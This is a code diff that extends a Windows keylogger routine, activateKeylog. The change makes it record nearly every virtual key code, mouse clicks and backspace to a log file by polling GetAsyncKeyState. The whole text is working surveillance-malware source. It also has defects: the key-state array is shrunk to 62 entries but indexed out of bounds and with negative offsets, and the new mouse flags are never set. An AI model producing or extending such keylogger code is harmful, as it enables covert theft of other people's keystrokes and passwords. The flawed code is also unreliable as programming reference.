@@ -20,15 +20,20 @@ DWORD WINAPI activateKeylog(LPVOID param)
         getchar();
         exit(1);
     }
+    unsigned char count = 1;
 
     char buffer[5] = {0};
-    bool keyDown[94] = {false};
+    bool keyDown[62] = {false};
+
+    fputs("\n", fp); fflush(fp);
     while (1) {
-        for(int i = 32; i < 127; i++){
+        for(int i = 0; i < 0xFE; i++){
             buffer[0] = (char)i;
             if ((GetAsyncKeyState(i) & 0x8000) && !keyDown[i-32]) {
+                count++;
+                if ((short)count == 125){fputs("\n", fp); fflush(fp); count = 0;}
                 sprintf(buffer, "%c", (char)i);
-                printf(buffer);
+                printf("%c %d\n", (char)i, i);
                 fputs(buffer, fp);
                 fflush(fp);
                 keyDown[i-32] = true;
@@ -36,6 +41,16 @@ DWORD WINAPI activateKeylog(LPVOID param)
                 keyDown[i-32] = false;
             }            
         }
+
+        if ((GetAsyncKeyState(1) & 0x8000) && !keyDown[0]){ fputs("[MOUSE1]", fp); fflush(fp);}
+        else if (!(GetAsyncKeyState(1) & 0x8000)) keyDown[0] = false;
+
+        if ((GetAsyncKeyState(2) & 0x8000) && !keyDown[1]){ fputs("[MOUSE2]", fp); fflush(fp);}
+        else if (!(GetAsyncKeyState(2) & 0x8000)) keyDown[1] = false;
+
+        if ((GetAsyncKeyState(8) & 0x8000) && !keyDown[2]){ fputs("[BACKSPACE]", fp); fflush(fp);}
+        else if (!(GetAsyncKeyState(8) & 0x8000)) keyDown[2] = false;
+
 
         Sleep(50);
     }
